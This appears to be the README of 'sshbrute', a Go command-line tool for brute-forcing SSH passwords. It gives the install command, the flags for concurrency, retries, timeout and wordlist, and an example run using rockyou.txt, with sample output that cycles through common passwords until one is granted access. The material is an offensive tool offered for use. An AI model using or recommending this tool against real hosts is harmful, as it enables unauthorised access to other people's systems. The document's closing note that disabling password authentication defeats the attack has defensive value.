# sshbrute

This is a program written in Golang for ssh brute force attacks, needs improvements but works well and is fast.

```sh
go get github.com/UlisseMini/sshbrute
```

```txt
Usage of sshbrute:
  -d    debug mode, print logs to stderr
  -g int
        how meny goroutines should be making concurrent connections (default 16)
  -retry int
        How meny times to retry password on a timeout (default 3)
  -t duration
        Set the timeout depending on the latency between you and the remote host. (default 400ms)
  -w string
        indicate wordlist file to use (default "wordlist.txt")
```

```sh
sshbrute username@localhost:2222 -t=300ms -w rockyou.txt
```

will give you some nice colored output where FAIL is red and ACCESS GRANTED is green and the password try is blue. (not on windows because it sucks lol)
```
target: username@localhost:2222
timeout: 200ms
wordlist: rockyou.txt
123456 FAILED
12345 FAILED
123456789 FAILED
password FAILED
iloveyou FAILED
princess FAILED
1234567 FAILED
rockyou FAILED
12345678 FAILED
abc123 ACCESS GRANTED
```

If the target sshd is using "PasswordAuthentication no" it won't work.
